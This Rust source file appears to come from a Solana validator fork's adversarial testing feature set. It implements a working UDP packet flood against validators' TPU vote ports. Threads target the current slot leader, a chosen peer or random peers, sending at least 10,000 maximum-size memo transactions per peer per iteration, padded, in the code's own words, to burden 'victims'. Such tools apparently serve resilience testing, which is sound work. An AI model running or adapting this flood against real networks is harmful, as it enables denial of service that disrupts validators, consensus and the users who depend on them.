use {
    crate::{
        adversary_feature_set::tpu_packet_flood::{FloodConfig, FloodStrategy},
        flood_worker::{create_rayon_thread_pool, AdversaryWorkersContext, ExitCondition},
    },
    bincode::serialize,
    log::*,
    rand::{seq::SliceRandom, thread_rng, Rng},
    rayon::{
        iter::{IntoParallelIterator, ParallelIterator},
        ThreadPool,
    },
    solana_gossip::{
        cluster_info::ClusterInfo,
        contact_info::{ContactInfo, Protocol},
        gossip_error::GossipError,
    },
    solana_ledger::leader_schedule_cache::LeaderScheduleCache,
    solana_net_utils::bind_to_unspecified,
    solana_runtime::bank_forks::BankForks,
    solana_signer::Signer,
    solana_transaction::Transaction,
    spl_memo_interface::instruction::build_memo,
    std::{
        net::{SocketAddr, UdpSocket},
        num::Saturating,
        sync::{Arc, RwLock},
        thread::Builder,
        time::{Duration, Instant},
    },
};

pub const MAX_PACKETS_PER_PEER_PER_ITERATION: usize = 10_000;

pub fn start(
    cluster_info: Arc<ClusterInfo>,
    bank_forks: Arc<RwLock<BankForks>>,
    leader_schedule_cache: Arc<LeaderScheduleCache>,
    configs: Vec<FloodConfig>,
) -> AdversaryWorkersContext {
    let exit = Arc::new(ExitCondition::default());
    let thread_pool = create_rayon_thread_pool("solAdvTPFWrkr");
    let send_socket = bind_to_unspecified().unwrap();
    let mut i = Saturating(0);
    let thread_hdls = configs
        .into_iter()
        .map(|config| {
            let exit = exit.clone();
            let thread_pool = thread_pool.clone();
            let cluster_info = cluster_info.clone();
            let bank_forks = bank_forks.clone();
            let leader_schedule_cache = leader_schedule_cache.clone();
            let thread_name = format!("solAdvTpuFld{i:02}");
            let send_socket = send_socket.try_clone().unwrap();
            i += 1;
            Builder::new()
                .name(thread_name.clone())
                .spawn(move || {
                    run(
                        &cluster_info,
                        &exit,
                        &thread_pool,
                        config,
                        thread_name,
                        bank_forks,
                        leader_schedule_cache,
                        &send_socket,
                    );
                })
                .unwrap()
        })
        .collect();
    AdversaryWorkersContext::new(exit, thread_hdls)
}

// cluster_info.send_transaction() was removed in upstream Agave #3473. Retained
// here for compatibility during upstream sync process because of its use in adversary
// TPU.
pub fn send_tpu_transaction_udp(
    cluster_info: &ClusterInfo,
    transaction: &Transaction,
    tpu: Option<SocketAddr>,
    send_socket: &UdpSocket,
) -> Result<(), GossipError> {
    let tpu = tpu.unwrap_or_else(|| cluster_info.my_contact_info().tpu(Protocol::UDP).unwrap());
    let buf = serialize(transaction)?;
    send_socket.send_to(&buf, tpu)?;
    Ok(())
}

fn flood_tpu_udp_vote_port(
    cluster_info: &ClusterInfo,
    config: &FloodConfig,
    peers: &[ContactInfo],
    thread_pool: &ThreadPool,
    send_socket: &UdpSocket,
) -> usize {
    let mut packet_count: usize = 0;

    // Add a memo to bloat the transaction to maximum valid size (more data for
    // victims to handle).
    let base_memo = "The quick brown fox jumped over the lazy dog. ".repeat(22) + "!";

    for peer in peers {
        let tpu = peer.tpu_vote(Protocol::UDP);
        thread_pool.install(|| {
            let votes_to_send = config
                .packets_per_peer_per_iteration
                .max(MAX_PACKETS_PER_PEER_PER_ITERATION);
            (0..votes_to_send).into_par_iter().for_each(|_| {
                let unique = thread_rng().gen::<u64>().to_string();
                // Trim the base memo to make room for the unique string.
                let trim_length = base_memo.len() - unique.len();
                let memo = base_memo[..trim_length].to_string() + &unique;
                let memo_instruction =
                    build_memo(&spl_memo_interface::v3::id(), memo.as_bytes(), &[]);
                let vote_tx = Transaction::new_with_payer(
                    &[memo_instruction.clone()],
                    Some(&cluster_info.keypair().pubkey()),
                );
                let send_socket = send_socket.try_clone().unwrap();
                let _ = send_tpu_transaction_udp(cluster_info, &vote_tx, tpu, &send_socket);
            });
            packet_count += votes_to_send;
        });
    }
    packet_count
}

fn get_peers_to_flood(
    cluster_info: &ClusterInfo,
    config: &FloodConfig,
    bank_forks: Arc<RwLock<BankForks>>,
    leader_schedule_cache: Arc<LeaderScheduleCache>,
) -> Vec<ContactInfo> {
    const DEFAULT_NUM_PEERS: usize = 10;
    // Target the leader if the config indicates we should.
    let peer_to_target = if config.target_leader {
        leader_schedule_cache.slot_leader_at(bank_forks.read().unwrap().working_bank().slot(), None)
    } else {
        config.target
    };

    let peers = cluster_info.tpu_peers();
    if let Some(peer_id) = peer_to_target {
        // Specific flood victim specified.
        peers
            .iter()
            .find(|ci| *ci.pubkey() == peer_id)
            .cloned()
            .map(|ci| vec![ci])
            .unwrap_or_else(|| {
                error!("TPU packet flood: target={peer_id:?} not found");
                Vec::default()
            })
    } else {
        // No target specified. Just flood a random subset of peers.
        let mut rng = rand::thread_rng();
        peers
            .choose_multiple(&mut rng, DEFAULT_NUM_PEERS)
            .cloned()
            .collect()
    }
}

fn run(
    cluster_info: &ClusterInfo,
    exit: &ExitCondition,
    thread_pool: &ThreadPool,
    config: FloodConfig,
    thread_name: String,
    bank_forks: Arc<RwLock<BankForks>>,
    leader_schedule_cache: Arc<LeaderScheduleCache>,
    send_socket: &UdpSocket,
) {
    const REPORT_INTERVAL_MS: u64 = 2_000;
    let mut last_report = Instant::now();
    let mut iteration: u64 = 0;
    let mut packet_count: usize = 0;

    while !exit.is_set() {
        let start = Instant::now();
        // Find the peers to flood.
        let peers = get_peers_to_flood(
            cluster_info,
            &config,
            bank_forks.clone(),
            leader_schedule_cache.clone(),
        );

        if peers.is_empty() {
            // No peers to flood. Give gossip some time to find peers before
            // trying again.
            exit.wait_is_set(Duration::from_secs(2));
            continue;
        }

        // Flood the peers.
        packet_count = packet_count.saturating_add(match config.flood_strategy {
            FloodStrategy::UdpVoteOverflow => {
                flood_tpu_udp_vote_port(cluster_info, &config, &peers, thread_pool, send_socket)
            }
        });

        // Report metrics for the flood.
        if last_report.elapsed() >= Duration::from_millis(REPORT_INTERVAL_MS) {
            let num_peers = peers.len();
            info!(
                "TPU packet flood {thread_name}: strategy={:?} num_peers={num_peers} \
                 iteration={iteration}, packets={packet_count}",
                config.flood_strategy
            );
            packet_count = 0;
            last_report = Instant::now();
        }
        iteration = iteration.saturating_add(1);

        // Delay before the next iteration of flooding.
        if config.iteration_duration > start.elapsed() {
            exit.wait_is_set(config.iteration_duration - start.elapsed());
        }
    }
}
